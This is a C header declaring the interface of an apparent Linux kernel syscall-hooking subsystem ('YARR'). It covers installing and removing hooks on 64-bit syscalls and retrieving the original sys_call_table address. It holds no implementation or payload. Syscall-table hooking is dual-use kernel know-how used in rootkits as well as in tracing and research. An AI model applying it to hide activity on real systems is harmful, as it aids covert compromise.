#ifndef __YARR_HOOK
#define __YARR_HOOK

#define __CAST_TO_SYSCALL(ptr) ((long (*)(const struct pt_regs *))(ptr))

/**
 * Initializes the hook subsystem.
 *
 * @return: Zero on success, non-zero elsewhere.
 */
int hook_init(void);

/**
 * Stops the hook subsystem.
 *
 * @return: Zero on success, non-zero elsewhere.
 */
int hook_finish(void);

/**
 * Installs a new hook function for a specific syscall. The function address
 * passed must be the function generated by the YARRCALL64_DEFINE() macro. This
 * function name takes the form __yarr__x64_sys_<sname> where <sname> is the
 * name of the syscall (i.e. read, write, fork, kill, etc).
 *
 * @n: The syscall number we want to hook (usually one of the __NR_<name>
 * macros.
 * @fnc_addr: The address of the hook function.
 * @return: Zero on success, non-zero elsewhere.
 */
int install_hook(int n, void *fnc_addr);

/**
 * Uninstall whatever hooks are there for a specific syscall and sets back the
 * original syscall.
 *
 * @n: The syscall number we want to hook.
 * @return: Zero on success, non-zero elsewhere.
 */
int uninstall_hook(int n);

/**
 * Returns the address of the original 64-bit syscall table, the one that the
 * kernel was using before this subsystem hook it.
 *
 * @return: The address of the sys_call_table or NULL.
 */
void * get_original_syscall_table64(void);

#endif
